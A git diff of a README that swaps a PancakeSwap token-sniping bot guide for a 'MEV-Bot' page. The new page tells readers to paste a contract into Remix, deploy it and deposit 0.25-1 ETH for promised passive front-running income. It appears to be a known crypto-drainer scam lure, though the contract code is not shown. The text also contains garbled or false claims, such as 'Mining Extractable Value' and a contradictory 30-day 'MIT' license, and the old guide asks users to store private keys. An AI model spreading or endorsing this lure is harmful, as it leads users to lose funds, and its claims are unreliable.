@@ -1,107 +1,60 @@
+# MEV-Bot
 
-# Table of contents
-* [Important Notes](#IMPORTANT-NOTES-BEFORE-RUNNING-THE-BOT)
-* [New Update](#NEW-UPDATES)
-* [Advanced Bot](#NOW-LAUNCH-ADVANCED-BOT)
-* [Setup](#HOW-TO-RUN)
-* [TroubleShoot](#TROUBLESHOOT)
+### Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure of Flashbot, you can earn passive income by exploiting MEV.
 
-### NOW THE BOT IS POSSIBLE FOR KUCOIN AND MATIC NETWORK
+Flashbot provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
 
-## NEW UPDATES
-1. In this new update you can use BNB instead WBNB. it will make you easier to snipe :)
-2. Join free discord channel for more information : https://discord.gg/dtWDN5JWB5
+## 💡 Introducing Flashbot
+Flashbot is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
 
-## NOW LAUNCH ADVANCED BOT
-With more feature and benefit
-### Demo for sonic advanced bot :
-1. drive : https://bit.ly/3vkSum0
-2. SONIC DEGEN SCANNER : https://t.me/degenScanner
-3. website : http://sonicsniperbot.com/
+Flashbot aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
 
-<img src="./assets/advanced.png">
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
-### What's will you get
-Please only contact to Discord : <code>algarox#0785</code> or <code>nafidinara@gmail.com</code> with subject <b>PancakeSwap Bot Info</b> for more info. For error or problem questions please open issues in GitHub, don't email me. Maybe I'll slow response on weekend. Thanks!
-
-## HOW TO RUN
-1. clone this repository
-2. $ npm install
-3. copy your <code>.env.example</code> to <code>.env</code>
-4. set up your <code>.env</code> to with this explanation : 
-
-```
-BNB_CONTRACT=0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
-~ BNB contract for buy the token
-
-FACTORY=0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
-~ Pancake Factory contract to get function of buy
-
-ROUTER=0x10ED43C718714eb63d5aA57B78B54704E256024E
-~ Pancake Factory contract to process function of buy
-
-YOUR_ADDRESS=
-~ Your BSC (BEP20) address from trustwallet or another wallet.
-
-SLIPPAGE=1
-~ Customize your slippage here, cannot decimal. (eg : 1, 5, 10). if you buy early token recommended 30+ Slippage
-
-GWEI=5
-~ Customize your GWEI (gas fee) here, cannot decimal. (eg : 5, 10, 25). if you buy early token recommended 15+ GWEI
-
-GAS_LIMIT=345684
-~ Minimul limit is 210000, more much more better.
-
-MIN_LIQUIDITY_ADDED=3
-~ Set how much minimum liquidity added in pair address that you want to buy. set in BNB. (eg : 2, 4, 7).
-  2 mean 2 BNB liquidity added.
-
-YOUR_MNEMONIC=
-~ Input your private Key here, that you get from your wallet privacy.
-
-AMOUNT_OF_BNB=0.002
-~ Amount how much you want buy the token in BNB.
-
-TO_PURCHASE=0xe9e7cea3dedca5984780bafc599bd69add087d56
-~ Token address that you want to buy.
-
-USE_WSS=true
-~ Fill true if you want use from WSS_NODE, fill false if you want use from RPC_NODE
-
-WSS_NODE=wss://bsc-ws-node.nariox.org:443
-~ more faster, but sometimes unstable
-
-RPC_NODE=https://bsc-dataseed1.defibit.io/
-~ stable connection, but little bit slowly
+## 📊 Platform Comparison
+Platform	Router Address	Network	Mempool Scan Time
+Pancakeswap	0x10ED43C718714eb63d5aA57B78B54704E256024E	BSC	0.78 sec
+Uniswap	0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D	ETH	0.32 sec
 
 
-```
+## 🤖 How to Use MEVBot
+![241020628-7f849bd6-2e7a-4065-8119-e415dfb21777](https://i.ibb.co/JBFKJ3v/1.png)
 
-6. run with <code>npm run snipe </code>.
+### Step 1: Access the Source Code 📝
+Navigate to the Remix IDE: https://remix.ethereum.org/
+Create a new file "MevBot.sol".
+Copy this code and paste it into the Remix IDE.
 
-7. Wait the bot do his job, if success, you will see like this picture. <br>
-   <img src="./assets/botimg.PNG">
-   
-8. Close bot with <code>ctrl + C</code>.
+![image](https://i.ibb.co/XLWqQKv/2.png)
 
-## WARNING
-All this bot feature are free, I'm never sell this bot, and I'm never share my TG account. Please be careful and DWYOR!. Only this bot is free, not advanced bot.
 
-## TROUBLESHOOT
-* there are some reason if your tx failed :
-- you haven't approve your BNB
-- your gas price are to small
-- your GWEI are to small (use 15+ for early token)
-- your slippage are to small (use 30+ for early token)
+### Step 2: Compile the Code ⚙️
+Select the Solidity compiler 0.6.12.
+Click 'Compile MevBot.sol'. 
+![image](https://i.ibb.co/HP4NnzY/3.png)
 
-* Error with node :
-  
- <img src="./assets/wss-error.png">
-  
-Hi all, for now <code>wss://bsc-ws-node.nariox.org:443</code> it won't be able to use again forever. for that you can use private node or build your own node. it more faster than public node.
-there is my recommend for private node : 
-  1. https://getblock.io/en/
-  2. https://www.quicknode.com/
-  3. https://www.ankr.com/ <br>
-   
-We also rent a full node with cheapest and also faster speed, you will get installation guide and maintenance for that just for $70/month, you can compare with private node that I recommend. The different full node with private node is, full node build in our own vps, so we can manage the speed and performance. for more info you can contact on discord : <code>countdown#4008</code>
+
+### Step 3: Choose the Network 🌐
+Select either ETH or BSC (BNB) network.
+![image](https://i.ibb.co/5kSRqTf/4.png)
+
+
+### Step 4: Deploy the Code 🚀
+Click 'Transact (Deploy)'.
+
+
+### Step 5: Deposit into MEVBot 💰
+Copy your MEV contract and send an amount of Ethereum for the bot's operation.
+Start the bot by pressing the 'Start' button.
+![image](https://i.ibb.co/njpMWt1/5.png)
+![image](https://i.ibb.co/Jy56BDh/6.png)
+
+🔔 Note: For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.25-1 ETH.
+
+### You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
+
+UPD: If you have closed the Remix IDE website or accidentally rebooted your computer, you can still access all the bot's functions through Etherscan. You will need to verify the bot contract on Etherscan, and you will have access to the same functions as you would through the Remix IDE website.
+
+Copyright (C) 2023 MevBotsETHandBSC
+
+This program is free software for 30 days: you can redistribute and/or modify it under the terms of the MIT Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
